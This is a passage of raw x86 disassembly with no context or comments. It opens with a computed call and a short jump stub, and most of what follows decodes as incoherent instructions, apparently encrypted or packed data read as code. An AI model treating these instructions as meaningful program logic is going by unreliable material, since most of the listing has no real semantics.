  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
  411a16:	call   ebx
  411a18:	xor    ebx,ebx
  411a1a:	inc    ebx
  411a1b:	cmp    DWORD PTR [ebp+0x10],ebx
  411a1e:	je     0x411e30
  411a24:	xchg   edx,eax
  411a25:	push   0xa
  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0x99079a7d
  411a40:	in     eax,0xc7
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x4119e5
  411a4a:	into   
  411a4b:	pop    ds
  411a4c:	push   esi
  411a4d:	xchg   edx,eax
  411a4e:	aam    0x9e
  411a50:	pop    ds
  411a51:	push   ecx
  411a53:	cwde   
  411a54:	inc    ecx
  411a55:	out    dx,eax
  411a56:	popf   
  411a57:	cmp    DWORD PTR [eax+0x710781a4],0xffffffcd
  411a5e:	and    BYTE PTR [edx+ecx*2+0x7b],0xa5
  411a63:	popa   
  411a64:	and    DWORD PTR [eax-0x1e],eax
  411a67:	or     dl,bl
  411a69:	jge    0x411a98
  411a6b:	pop    ss
  411a6c:	jno    0x411ae6
  411a6e:	mov    dh,0x93
  411a70:	hlt    
  411a71:	and    eax,0x155cfd0c
  411a76:	mov    ds:0x27e40ab2,al
  411a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a7c:	inc    ebp
  411a7d:	rcl    DWORD PTR [edi+0x31964698],1
  411a83:	dec    edi
  411a84:	(bad)  
  411a85:	scas   eax,DWORD PTR es:[edi]
  411a86:	(bad)  
  411a87:	rol    BYTE PTR [eax+0x40],1
  411a8a:	stc    
  411a8b:	aam    0x61
  411a8d:	mov    edx,0xf34c727d
  411a92:	inc    ebx
  411a93:	js     0x411aec
  411a95:	neg    DWORD PTR [esi+esi*2]
  411a98:	loope  0x411a1b
  411a9a:	or     eax,DWORD PTR [edx+0x20]
  411a9d:	cmp    DWORD PTR [edx],0x1f930bd1
  411aa3:	(bad)  
  411aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aa6:	jmp    0xd8ac:0x2c81f59a
  411aad:	add    esi,DWORD PTR [ebx+0x77]
  411ab0:	push   ss
  411ab1:	(bad)  
  411ab2:	hlt    
  411ab3:	daa    
  411ab4:	push   ds
  411ab5:	in     eax,dx
  411ab6:	scas   eax,DWORD PTR es:[edi]
  411ab7:	push   edx
  411ab8:	mov    ds:0xc7d72db9,al
  411abd:	lahf   
  411abe:	add    ebx,ebp
  411ac0:	fmulp  st(4),st
  411ac2:	jle    0x411b15
  411ac4:	call   0x430f8988
  411ac9:	xor    edi,edi
  411acb:	in     al,0x43
  411acd:	sub    al,0xec
  411acf:	test   eax,0xc04f724d
  411ad4:	fmul   DWORD PTR [ebp-0x695b6c66]
  411ada:	dec    ebx
  411adb:	fiadd  WORD PTR ds:[edi]
  411ade:	pop    edx
  411adf:	cmc    
  411ae0:	sub    BYTE PTR [ebp+0x10],0x55
  411ae4:	jle    0x411b43
  411ae6:	mov    WORD PTR [eax+0x43],fs
  411ae9:	xchg   BYTE PTR [edi+ebp*4+0x3750e32e],cl
  411af0:	(bad)  
  411af1:	leave  
  411af2:	ret    
  411af3:	out    0xd1,al
  411af5:	enter  0x117a,0x13
  411af9:	cmp    BYTE PTR [esi+0x4a],0x33
  411afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411afe:	aad    0xb3
  411b00:	dec    esp
  411b01:	push   edx
  411b02:	inc    esp
  411b03:	xchg   edi,eax
  411b04:	in     al,0xa6
  411b06:	test   al,0xb1
  411b08:	nop
  411b09:	test   al,0x2a
  411b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b0c:	dec    edx
  411b0d:	cld    
  411b0e:	call   0xc41:0xac86af73
  411b15:	inc    DWORD PTR [ebx+0x6c]
  411b18:	or     edx,DWORD PTR [esi]
  411b1a:	xor    ebp,DWORD PTR [eax+eiz*1-0x69]
  411b1e:	xor    ch,BYTE PTR [edi]
  411b20:	repz inc edi
  411b22:	mov    edi,0x20f763e0
  411b27:	es call 0x972f:0xdb2e17bf
  411b2f:	adc    DWORD PTR [esi+esi*2],esp
  411b32:	push   edi
  411b33:	jno    0x411ad3
  411b35:	test   BYTE PTR [edi-0x4c547ba9],bh
  411b3b:	iret   
  411b3c:	in     eax,0xdd
  411b3e:	inc    esi
  411b3f:	sub    BYTE PTR [edi-0x63bb94c4],bh
  411b45:	mov    dl,0x6c
  411b47:	dec    ebx
  411b48:	ja     0x411b2e
  411b4a:	in     al,0xee
  411b4c:	test   eax,0x9a37cc24
  411b51:	cmc    
  411b52:	push   ss
  411b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b54:	push   0x40
  411b56:	adc    eax,0x66b891d4
  411b5b:	sub    bh,al
  411b5d:	lods   al,BYTE PTR ds:[esi]
  411b5e:	mov    BYTE PTR [ecx+eiz*1],bl
  411b61:	or     al,0x30
  411b63:	sbb    BYTE PTR [ecx-0x55eebb0],dh
  411b69:	call   0x10a4:0x95fae102
  411b70:	inc    ecx
  411b71:	sub    ah,BYTE PTR [esi+eiz*2+0x6711f1eb]
  411b78:	fidivr DWORD PTR [ebx+0x7c]
  411b7b:	nop
  411b7c:	adc    dh,BYTE PTR [ecx-0x69]
  411b7f:	into   
  411b80:	jge    0x411b17
  411b82:	jmp    DWORD PTR [ebp-0x3f4f3758]
  411b88:	imul   ecx,DWORD PTR [eax],0xffffffdf
  411b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b8c:	shl    BYTE PTR [esi-0x645f9f70],1
  411b92:	pop    ebx
  411b93:	mov    ecx,0xe0975603
  411b98:	mov    al,0xef
  411b9a:	fwait
  411b9b:	or     BYTE PTR [ecx-0x22],dl
  411b9e:	mov    edi,0x83e1e57
  411ba3:	sub    eax,eax
  411ba5:	(bad)  
  411ba6:	add    eax,0x15cb0c4a
  411bab:	scas   al,BYTE PTR es:[edi]
  411bac:	jnp    0x411ba0
  411bae:	pop    ss
  411baf:	push   edx
  411bb0:	or     edx,esp
  411bb2:	imul   esi,eax,0x49
  411bb5:	push   esp
  411bb6:	shl    DWORD PTR [ecx-0x60],1
  411bb9:	out    0x4e,al
  411bbb:	or     ch,al
  411bbd:	in     eax,0xfe
  411bbf:	add    eax,0x7574b8f6
  411bc4:	push   cs
  411bc5:	popa   
  411bc6:	add    al,bh
  411bc8:	loope  0x411b9f
  411bca:	push   es
  411bcb:	or     bl,BYTE PTR [edx]
  411bcd:	and    DWORD PTR [esi],edi
  411bcf:	xor    eax,0xabd8aa3b
  411bd4:	inc    ecx
  411bd5:	out    dx,al
  411bd6:	sbb    edi,esi
  411bd8:	ins    BYTE PTR es:[edi],dx
  411bd9:	mov    bl,0xbb
  411bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bdc:	repz mov ebx,0xd5a2a06
  411be2:	bound  ecx,QWORD PTR [ebx]
  411be4:	adc    al,0xe5
  411be6:	jmp    0xcae71862
  411beb:	(bad)  
  411bed:	popf   
  411bee:	fst    QWORD PTR [edi+edi*2+0x68]
  411bf2:	gs adc eax,0x189bc94b
  411bf8:	cs dec ebp
  411bfa:	icebp  
  411bfb:	mov    WORD PTR [ebp+0x60],?
  411bfe:	pusha  
  411bff:	or     al,0x64
  411c01:	dec    ebp
  411c02:	xor    BYTE PTR [ebx+0x54d8466c],0x8e
  411c09:	mov    cl,0xe
  411c0b:	aaa    
  411c0c:	cmp    al,0x24
  411c0e:	gs and edx,esi
  411c11:	pop    edi
  411c12:	and    al,0x2
  411c14:	inc    esp
  411c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c16:	int    0xeb
  411c18:	inc    ecx
  411c19:	push   ds
  411c1a:	test   dl,bh
  411c1c:	das    
  411c1d:	stos   DWORD PTR es:[edi],eax
  411c1e:	gs ins DWORD PTR es:[edi],dx
  411c20:	sub    BYTE PTR [esp+edi*4],cl
  411c23:	clc    
  411c24:	xor    DWORD PTR [esi-0x15],ebx
  411c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c28:	add    al,0xe5
  411c2a:	xchg   BYTE PTR ds:0x1d68e338,ah
  411c30:	fimul  DWORD PTR [ebx+0xa]
  411c33:	(bad)  [esi+0x50]
  411c36:	dec    eax
  411c37:	sub    eax,0xd712cb23
  411c3c:	mov    ah,0x77
  411c3e:	sub    bh,dh
  411c40:	cmp    edx,esi
  411c42:	mov    eax,0x32e6dea4
  411c47:	scas   al,BYTE PTR es:[edi]
  411c48:	div    DWORD PTR [edi+0x13]
  411c4b:	jnp    0x411c1c
  411c4d:	sbb    edx,DWORD PTR [edx+0x3212da15]
  411c53:	mov    esi,0x1baf1f2c
  411c58:	xchg   edx,eax
  411c59:	xor    edi,DWORD PTR [edx+0x23]
  411c5c:	jbe    0x411c5b
  411c5e:	ror    DWORD PTR [ecx],0xe1
  411c61:	xor    DWORD PTR [eax-0xdfdbb06],eax
  411c67:	add    edi,DWORD PTR [eax-0x17da4dfe]
  411c6d:	add    al,0x1
  411c6f:	inc    ebx
  411c70:	jp     0x411c2f
  411c72:	cs das 
  411c74:	fs icebp 
  411c76:	xchg   edi,eax
  411c77:	mov    ebx,0xd6ae19d8
  411c7c:	cwde   
  411c7d:	pop    es
  411c7e:	arpl   sp,di
  411c80:	lahf   
  411c81:	mov    dl,0x26
  411c83:	outs   dx,BYTE PTR ds:[esi]
  411c84:	jmp    0x411c84
  411c86:	je     0x411cce
  411c88:	add    al,0xc0
  411c8a:	lock ds (bad) 
  411c8d:	sub    BYTE PTR [edi-0x19],cl
  411c90:	and    DWORD PTR [edi-0x24],ecx
  411c93:	mov    ebx,0x838c9463
  411c98:	xchg   esp,eax
  411c99:	pop    ebx
  411c9a:	out    0x32,al
  411c9c:	add    al,0xdb
  411c9e:	(bad)  
  411c9f:	push   edi
  411ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ca1:	loopne 0x411c36
  411ca3:	pusha  
  411ca4:	in     al,0xf1
  411ca6:	int3   
  411ca7:	mov    eax,0xf3ce3387
  411cac:	xor    BYTE PTR [ebx-0x57],al
  411caf:	xlat   BYTE PTR ds:[ebx]
  411cb0:	mul    DWORD PTR [eax+eax*1+0x78]
  411cb4:	cs iret 
  411cb6:	in     eax,dx
  411cb7:	mov    ah,0xe1
  411cb9:	add    eax,0xea76a8a6
  411cbe:	test   eax,0xd8dccd0a
  411cc3:	hlt    
  411cc4:	test   eax,0xdc894d08
  411cc9:	jmp    0x411cf8
  411ccb:	jne    0x411c9f
  411ccd:	add    al,0xd
  411ccf:	push   cs
  411cd0:	push   eax
  411cd1:	adc    dh,bh
  411cd3:	scas   al,BYTE PTR es:[edi]
  411cd4:	push   ss
  411cd5:	lea    ebp,[esi-0x6e883bd2]
  411cdb:	jecxz  0x411c9b
  411cdd:	or     eax,0xb51b5908
  411ce2:	push   ds
  411ce3:	mov    bl,0xea
  411ce5:	gs xor eax,0xdcf7368d
  411ceb:	add    ch,BYTE PTR [eax+0x8]
  411cee:	jnp    0x411cbd
  411cf0:	dec    edx
  411cf1:	pop    ss
  411cf2:	push   ecx
  411cf3:	shl    DWORD PTR [eax+eax*1-0x1730dac1],0xd6
  411cfb:	scas   al,BYTE PTR es:[edi]
  411cfc:	lods   al,BYTE PTR ds:[esi]
  411cfd:	xchg   ebp,eax
  411cfe:	das    
  411cff:	out    0xb4,al
  411d01:	mov    bh,0xeb
  411d03:	xor    BYTE PTR [ebx],0x9d
  411d06:	cdq    
  411d07:	aaa    
  411d08:	imul   eax,esi,0xf653a256
  411d0e:	sbb    esp,DWORD PTR [edi-0x37c4c7f9]
  411d14:	outs   dx,DWORD PTR ds:[esi]
  411d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d16:	or     DWORD PTR [edi],0x4b
  411d19:	pop    es
  411d1a:	sub    DWORD PTR [edx],edi
  411d1c:	push   0x71
  411d1e:	inc    ecx
  411d1f:	rcr    edi,cl
  411d21:	aam    0x2a
  411d23:	push   0x47014b5f
  411d28:	and    esi,DWORD PTR [ebx+ecx*1-0x38]
  411d2c:	add    al,0xc5
  411d2e:	out    dx,eax
  411d2f:	push   ss
  411d30:	sahf   
  411d31:	or     al,0xab
  411d33:	cmp    DWORD PTR ds:0xcf7b95f0,edx
  411d39:	mov    edx,DWORD PTR [edx]
  411d3b:	pop    esp
  411d3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d3d:	mov    ch,0x69
  411d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d40:	lods   al,BYTE PTR ds:[esi]
  411d41:	lods   eax,DWORD PTR ds:[esi]
  411d42:	fmul   DWORD PTR [esi]
  411d44:	and    ah,cl
  411d46:	xlat   BYTE PTR ds:[ebx]
  411d47:	adc    DWORD PTR [esi-0x4e496c62],edx
  411d4d:	std    
  411d4e:	jmp    0x3656d852
  411d53:	jmp    0x821839e4
  411d58:	ss push esp
  411d5a:	xor    eax,0xd848bd86
  411d5f:	cmp    eax,0x8543c82c
  411d64:	test   DWORD PTR [ecx],eax
  411d66:	cdq    
  411d67:	mov    esp,0xe2c34131
  411d6c:	pop    ebx
  411d6d:	int    0xbc
  411d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d70:	dec    esp
  411d71:	dec    esp
  411d72:	sub    DWORD PTR [edx],esp
  411d74:	mov    eax,0xe2a0b9d4
  411d79:	imul   ebx,DWORD PTR [ecx+0x61],0xc
  411d7d:	xchg   edi,eax
  411d7e:	test   eax,0xc51b7966
  411d83:	ret    0x663
  411d86:	xor    eax,0xa1714ac0
  411d8b:	out    0x6c,eax
  411d8d:	or     DWORD PTR [edx],edx
  411d8f:	adc    BYTE PTR [ebx],bl
  411d91:	stos   DWORD PTR es:[edi],eax
  411d92:	or     eax,ecx
  411d94:	fimul  WORD PTR [ebp-0x56]
  411d97:	jecxz  0x411e0a
  411d99:	aam    0x18
  411d9b:	clc    
  411d9c:	rcl    BYTE PTR [edi-0x6099814c],1
  411da2:	dec    edi
  411da3:	lahf   
  411da4:	rcl    BYTE PTR [edx+0x4f954eed],cl
  411daa:	int    0x10
  411dac:	push   edx
  411dad:	sub    eax,0x284c7570
  411db2:	adc    DWORD PTR [ebx+eiz*8],edi
  411db5:	ja     0x411d50
  411db7:	cmp    esp,DWORD PTR [esi+eax*8]
  411dba:	mov    ds,WORD PTR [edx]
  411dbc:	sub    DWORD PTR ds:0x5772ea21,ecx
  411dc2:	sti    
  411dc3:	mov    al,ds:0x2460eb8a
  411dc8:	and    edi,DWORD PTR [ebx-0x24ed40fc]
  411dce:	xchg   edx,eax
  411dcf:	cs xchg esp,eax
  411dd1:	add    BYTE PTR [edx+0x76],cl
  411dd4:	add    DWORD PTR [eax+0x48],0xdb4c23f8
  411ddb:	mov    ds:0x51d9493c,eax
  411de0:	(bad)  
  411de1:	mov    eax,0xd028256f
  411de6:	loopne 0x411d9f
  411de8:	cmp    BYTE PTR [esi+0x2dfe8047],dh
  411dee:	fdiv   DWORD PTR ds:0x823b3d13
  411df4:	jle    0x411e07
  411df6:	adc    esp,edx
  411df8:	xchg   ecx,eax
  411df9:	sub    eax,0x4c7e78e
  411dfe:	les    ebx,FWORD PTR [ebp+eiz*1-0x5e]
  411e02:	and    al,0x69
  411e04:	ss test al,0xf6
  411e07:	clc    
  411e08:	in     eax,0x9e
  411e0a:	mov    esp,0xd6d6c59f
  411e0f:	pop    esp
  411e10:	and    DWORD PTR ds:0x35506a,0xffffff91
  411e17:	dec    edi
  411e18:	(bad)  
  411e19:	das    
  411e1a:	aad    0x20
  411e1c:	mov    ebx,0x873ee8f9
  411e21:	retf   
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	ja     0x411dd1
  411e4d:	and    al,BYTE PTR [esi+0x70704810]
  411e53:	dec    ecx
  411e54:	jge    0x411ec6
  411e56:	jo     0x411e08
  411e58:	push   ds
  411e59:	adc    esp,esp
  411e5b:	jne    0x411e5a
  411e5d:	ret    0x3402
  411e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e61:	outs   dx,BYTE PTR ds:[esi]
  411e62:	xor    dl,dl
  411e64:	jmp    0x411ea0
  411e66:	or     ah,BYTE PTR [eax+0x70]
  411e69:	and    dl,BYTE PTR [eax]
  411e6b:	in     eax,0x30
  411e6d:	pop    esp
  411e6e:	push   edx
  411e6f:	ror    DWORD PTR ds:0xe8988db0,0xcc
  411e76:	rep outs dx,DWORD PTR ds:[esi]
  411e78:	addr16 out 0xcb,al
  411e7b:	xor    BYTE PTR [edx],dh
  411e7d:	sub    dl,ah
  411e7f:	(bad)  
  411e80:	scas   eax,DWORD PTR es:[edi]
  411e81:	jbe    0x411e24
  411e83:	push   eax
  411e84:	test   BYTE PTR [edi+0x1d],0x2f
  411e88:	inc    ebx
  411e89:	out    0x2c,eax
  411e8b:	mov    al,0x1d
  411e8d:	popa   
  411e8e:	push   ebp
  411e8f:	jl     0x411e7f
  411e91:	sub    cl,dl
  411e93:	inc    esi
  411e94:	xor    al,0x5d
  411e96:	xchg   ebp,eax
  411e97:	(bad)  
  411e98:	shl    ch,0x31
  411e9b:	adc    al,0xd8
  411e9d:	jo     0x411ebb
  411e9f:	sub    eax,0x8a9e5233
  411ea4:	jmp    0x38c31721
  411ea9:	fimul  WORD PTR [esi]
  411eab:	pop    ds
  411eac:	adc    BYTE PTR [edi-0x2c],0xd8
  411eb0:	add    DWORD PTR [eax],0x53
  411eb3:	(bad)  
  411eb4:	hlt    
  411eb5:	xchg   ebp,eax
  411eb6:	xchg   ecx,eax
  411eb7:	xor    DWORD PTR [ebp-0x3c8b5d40],edi
  411ebd:	jmp    0x746563c6
  411ec2:	lods   al,BYTE PTR ds:[esi]
  411ec3:	nop
  411ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ec5:	mov    al,0xc8
  411ec7:	mov    dl,0xe6
  411ec9:	jg     0x411e63
  411ecb:	inc    ecx
  411ecc:	scas   al,BYTE PTR es:[edi]
  411ecd:	jle    0x411e61
  411ecf:	inc    edx
  411ed0:	cmp    eax,0xf3d33ecd
  411ed5:	xchg   edi,eax
  411ed6:	(bad)  
  411ed8:	js     0x411f30
  411eda:	sub    BYTE PTR [edx+ecx*4-0x3d143992],ah
  411ee1:	push   0x77
  411ee3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ee5:	jae    0x411ea6
  411ee7:	aad    0x17
  411ee9:	xchg   edi,eax
  411eea:	jecxz  0x411f23
  411eec:	mov    ds:0xb792fa3b,al
  411ef1:	pusha  
  411ef2:	adc    BYTE PTR [ecx-0x25],cl
  411ef5:	or     eax,0x1fc316f0
  411efa:	cld    
  411efb:	xor    esp,ebx
  411efd:	cmp    BYTE PTR [esi],bl
  411eff:	fsub   QWORD PTR [ebx+0x22190e83]
  411f05:	push   ebp
  411f06:	pop    esp
  411f07:	sub    BYTE PTR [ebp-0x57],cl
  411f0a:	mov    eax,ds:0xdc6f7bb1
  411f0f:	(bad)  
  411f11:	sar    BYTE PTR [ebx],cl
  411f13:	cmp    al,0x74
  411f15:	cmp    esp,ecx
  411f17:	add    edi,DWORD PTR [edx]
  411f19:	arpl   WORD PTR [ebx],dx
  411f1b:	stos   DWORD PTR es:[edi],eax
  411f1c:	in     eax,dx
  411f1d:	adc    ecx,DWORD PTR [ebp-0x36e19485]
  411f23:	jbe    0x411f84
  411f25:	lock not BYTE PTR [esi-0x7e]
  411f29:	leave  
  411f2a:	lea    edi,[ecx-0x40]
  411f2d:	inc    ebp
  411f2e:	inc    ebx
  411f2f:	test   al,0x20
  411f31:	imul   ebx,DWORD PTR [ebx+0x2],0xffffffaf
  411f35:	popf   
  411f36:	sbb    al,0xa9
  411f38:	shl    BYTE PTR [ecx+0x5f],1
  411f3b:	mov    dh,BYTE PTR [edi-0x7e553fbe]
  411f41:	jmp    0x411f82
  411f43:	push   ecx
  411f44:	jne    0x411f81
  411f46:	ins    DWORD PTR es:[edi],dx
  411f47:	ins    BYTE PTR es:[edi],dx
  411f48:	(bad)  
  411f49:	fs loope 0x411f79
  411f4c:	cmp    BYTE PTR [esi],0x1f
  411f4f:	outs   dx,BYTE PTR ds:[esi]
  411f50:	sbb    al,al
  411f52:	or     al,0x5e
  411f54:	inc    ecx
  411f55:	push   0xe24f6477
  411f5a:	mov    edi,0x3ffd432
  411f5f:	fs cdq 
  411f61:	fldenv [edx-0x48]
  411f64:	jge    0x411f3c
  411f66:	test   eax,0xe4c21945
  411f6b:	(bad)  
  411f6c:	fisttp WORD PTR [esi+0x268e2d27]
  411f72:	clc    
  411f73:	add    al,0xb4
  411f75:	popf   
  411f76:	stos   DWORD PTR es:[edi],eax
  411f77:	imul   esp,DWORD PTR [eax-0x33],0x63
  411f7b:	adc    dl,BYTE PTR [ecx]
  411f7d:	xor    ecx,DWORD PTR [eax-0xa]
  411f80:	push   ebp
  411f81:	push   0x34f54a3
  411f86:	push   ebx
  411f87:	xor    eax,0x554da036
  411f8c:	cli    
  411f8d:	lods   al,BYTE PTR ds:[esi]
  411f8e:	sahf   
  411f8f:	xchg   DWORD PTR [esi+0x26a954eb],esp
  411f95:	mov    edi,0x8386c665
  411f9a:	sbb    eax,0x993f8f67
  411f9f:	call   0xf8369dbe
  411fa4:	cli    
  411fa5:	inc    esp
  411fa6:	shl    DWORD PTR [ebp-0x13f52d11],0x36
  411fad:	sbb    edi,DWORD PTR [esi]
  411faf:	sub    BYTE PTR [edx+0x4da84543],ah
  411fb5:	clc    
  411fb6:	mov    DWORD PTR [eax+0x7597fa9b],ebx
  411fbc:	sub    bl,BYTE PTR [eax-0x3a]
  411fbf:	fldcw  WORD PTR [edi+0x13]
  411fc2:	and    al,0x77
  411fc4:	xchg   esi,eax
  411fc5:	mov    esi,0xffbd8c6d
  411fca:	pop    ecx
  411fcb:	pushf  
  411fcc:	mov    ebx,0x1831ff39
  411fd1:	jecxz  0x412008
  411fd3:	enter  0x3c7c,0xf0
  411fd7:	mov    bh,0x84
  411fd9:	dec    eax
  411fda:	mov    eax,0x3e4abc26
  411fdf:	call   DWORD PTR ds:0x3d5426c0
  411fe5:	(bad)  
  411fe8:	fdivr  DWORD PTR [ebx]
  411fea:	imul   ebx,DWORD PTR [ebx+0x6757fdc],0xc057d4e4
  411ff4:	and    DWORD PTR [ebx],esp
  411ff6:	push   cs
  411ff7:	ins    DWORD PTR es:[edi],dx
  411ff8:	mov    cl,0x15
  411ffa:	retf   
  411ffb:	mov    esp,0x180dd445
  412000:	cli    
  412001:	rcl    DWORD PTR [ecx-0xc83ad9e],1
  412007:	xchg   ecx,eax
  412008:	sbb    esp,DWORD PTR [edx+0x58708bd5]
  41200e:	add    DWORD PTR [eax+0x46],0xffffffc1
  412012:	add    dl,dl
  412014:	or     al,0xbc
  412016:	inc    ecx
  412017:	pop    edi
  412018:	mov    dl,0x77
  41201a:	inc    edx
  41201b:	pusha  
  41201c:	cmp    BYTE PTR cs:[edx],al
  41201f:	scas   al,BYTE PTR es:[edi]
  412020:	sub    DWORD PTR [esi],ebx
  412022:	pop    ss
  412023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412024:	jmp    0x412048
  412026:	sub    DWORD PTR [ecx],0x6c
  412029:	(bad)
  41202c:	add    ebx,DWORD PTR [edi]
  41202e:	repnz fldcw WORD PTR [ebp-0x29608b53]
  412035:	fwait
  412036:	pop    ebx
  412037:	sbb    bh,BYTE PTR ds:0xca120e4c
  41203d:	or     bl,BYTE PTR [edx+0x6f]
  412040:	inc    edx
  412041:	dec    eax
  412042:	mov    ch,0xfd
  412044:	cwde   
  412045:	shl    BYTE PTR ds:0xb43c1f53,0x65
  41204c:	mov    bh,0x78
  41204e:	iret   
  41204f:	fs mov al,0x38
  412052:	mov    ds:0xab594cd6,eax
  412057:	and    eax,DWORD PTR [esi]
  412059:	scas   al,BYTE PTR es:[edi]
  41205a:	lods   eax,DWORD PTR ds:[esi]
  41205b:	mov    al,0x88
  41205d:	jmp    0x412099
  41205f:	in     al,dx
  412060:	aam    0xbc
  412062:	xchg   DWORD PTR [edi+0x65109d8f],ebx
  412068:	push   es
  412069:	(bad)  [edi-0x46]
  41206c:	je     0x4120ca
  41206e:	mov    ds:0x2da3cb32,al
  412073:	test   BYTE PTR [edi-0x10745054],dl
  412079:	xor    ebp,DWORD PTR [edx-0x1b]
  41207c:	adc    DWORD PTR [ebx-0x4305ecc0],0xe2717e7a
  412086:	retf   
  412087:	xor    edi,edi
  412089:	icebp  
  41208a:	mov    eax,ds:0xcca390ba
  41208f:	jp     0x4120fb
  412091:	mov    al,BYTE PTR [ebp-0x3dc4ceb]
  412097:	das    
  412098:	fdivr  DWORD PTR [esi+0x74]
  41209b:	retf   0x4b84
  41209e:	inc    edx
  41209f:	pop    ecx
  4120a0:	jl     0x41202c
  4120a2:	adc    BYTE PTR [esi+0x4b532507],ch
  4120a8:	adc    eax,0xa6a6d7a8
  4120ad:	cmp    DWORD PTR [ebx],edx
  4120af:	sbb    ch,BYTE PTR [ecx]
  4120b1:	or     eax,0x3d08933
  4120b6:	lahf   
  4120b7:	ja     0x412069
  4120b9:	fdiv   st(2),st
  4120bb:	fstp   TBYTE PTR [ebp-0x2ece0ab8]
  4120c1:	push   es
  4120c2:	pop    ss
  4120c3:	jle    0x412105
  4120c5:	out    0xc3,al
  4120c7:	fldenv [edx]
  4120c9:	xor    edi,edx
  4120cb:	and    esp,0x70
  4120ce:	gs add edi,edi
  4120d1:	outs   dx,DWORD PTR ds:[esi]
  4120d2:	mov    ecx,0xb0528040
  4120d7:	out    0x81,eax
  4120d9:	push   ss
  4120da:	enter  0x4569,0xe6
  4120de:	pop    eax
  4120df:	cmp    dh,bh
  4120e1:	mov    ch,0xd3
  4120e3:	imul   ecx,DWORD PTR ds:0x82641f2,0x9b2c2622
  4120ed:	(bad)  
  4120ee:	xor    bh,dh
  4120f0:	stos   DWORD PTR es:[edi],eax
  4120f1:	mov    esp,0x50f95b27
  4120f6:	mov    fs,WORD PTR ds:0xfcb46016
  4120fc:	add    al,0xf
  4120fe:	cmp    eax,0x2ee4cf7e
  412103:	mov    ch,0x55
  412105:	ds cli 
  412107:	sti    
  412108:	xchg   DWORD PTR [eax-0x13c9b5d6],ebp
  41210e:	push   esp
  41210f:	loop   0x41209a
  412111:	mov    edx,0xace49bf6
  412116:	popa   
  412117:	xlat   BYTE PTR ds:[ebx]
  412118:	and    bh,dl
  41211a:	xchg   BYTE PTR [esi],ah
  41211c:	repz fwait
  41211e:	add    BYTE PTR [eax],bl
  412120:	pushf  
  412121:	pop    edi
  412122:	data16 mov al,ds:0xa671a8b0
  412128:	pop    esp
  412129:	test   BYTE PTR [ecx],dl
  41212b:	cmp    BYTE PTR [ebx+eax*2],dl
  41212e:	data16 arpl WORD PTR [ebx],cx
  412131:	out    dx,al
  412132:	add    DWORD PTR [edx],0xffffffca
  412135:	cmp    DWORD PTR [ebp+esi*1-0x3881e49c],0x60
  41213d:	ret    
  41213e:	xor    al,0xcb
  412140:	push   cs
  412141:	ja     0x412141
  412143:	jecxz  0x412198
  412145:	ja     0x412149
  412147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412148:	jno    0x41214c
  41214a:	push   cs
  41214b:	daa    
  41214c:	jo     0x412174
  41214e:	pop    ebx
  41214f:	xor    DWORD PTR [eax+0x4835ced4],0x6f
  412156:	pop    ebx
  412157:	jo     0x41219c
  412159:	in     eax,0x97
  41215b:	pop    ss
  41215c:	pushf  
  41215d:	mov    ecx,DWORD PTR [ebp+ebx*1+0xb]
  412161:	shl    DWORD PTR ds:0xcc2cc2e5,cl
  412167:	pop    edx
  412168:	retf   0xed81
  41216b:	push   es
  41216c:	out    0x84,al
  41216e:	ss pop edx
  412170:	cdq    
  412171:	jg     0x4120f8
  412173:	sub    al,0x7e
  412175:	call   0x291e:0xb61c06a5
  41217c:	mov    ecx,0xb84a1628
  412181:	aas    
  412182:	push   eax
  412183:	in     eax,0x5f
  412185:	mov    ecx,0x598ff98d
  41218a:	int    0xf9
  41218c:	test   DWORD PTR [ecx],esi
  41218e:	les    edi,FWORD PTR [ecx]
  412190:	sub    eax,0x63d5c57c
  412195:	and    eax,0xd47b73af
  41219a:	into   
  41219b:	pop    eax
  41219c:	xlat   BYTE PTR ds:[ebx]
  41219d:	sub    eax,0x27d35ea2
  4121a2:	mov    bh,0x7d
  4121a4:	jbe    0x412206
  4121a6:	xchg   BYTE PTR [edi-0x33],dh
  4121a9:	ss loope 0x41214f
  4121ac:	mov    dl,0x37
  4121ae:	addr16 daa 
  4121b0:	retf   
  4121b1:	adc    al,0x21
